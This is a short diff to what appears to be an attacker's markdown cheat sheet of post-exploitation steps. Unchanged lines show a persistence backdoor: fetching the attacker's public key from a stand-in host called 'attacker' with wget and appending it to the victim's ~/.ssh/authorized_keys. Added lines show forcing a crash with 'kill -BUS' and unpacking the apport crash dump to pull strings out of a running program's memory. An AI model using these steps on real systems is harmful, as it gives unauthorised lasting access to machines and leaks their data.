@@ -73,6 +73,7 @@ Adding your SSH to the victim
 ---
 
 Append your public to the victim's ~/.ssh/authorized_keys
+
 ```
 On attacker:
 ssh-keygen
@@ -80,6 +81,20 @@ ssh-keygen
 On victim:
 wget http://attacker/id_rsa.pub
 cat id_rsa.pub >> ~/.ssh/authorized_keys
+```
+
+Getting Crash Data
+---
+
+While program is running, kill it with
+
+```
+kill -BUS <pid>
+
+Get the data from the crash log
+---
+apport-unpack /var/crash/_opt_count.1000.crash /tmp/crashed
+strings /tmp/crashed/CoreDump
 ```
 
 Other stuff
